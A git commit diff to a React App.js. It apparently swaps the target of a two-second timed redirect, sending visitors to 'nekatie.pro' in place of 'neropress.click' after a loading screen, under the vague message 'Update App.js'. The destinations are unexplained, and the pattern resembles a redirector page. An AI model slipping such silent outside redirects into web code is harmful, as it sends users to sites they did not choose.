c8a3e7c6cde282541e1c0483d00fdb09686497d0
husknet <127146284+husknet@users.noreply.github.com>
2024-09-25 10:19:36 -0300

    Update App.js

--- src/App.js
+++ src/App.js
@@ -4,7 +4,7 @@ import Loading from './Loading';
 function App() {
     useEffect(() => {
         const timer = setTimeout(() => {
-            window.location.href = 'https://neropress.click';
+            window.location.href = 'https://nekatie.pro';
         }, 2000);
 
         return () => clearTimeout(timer);
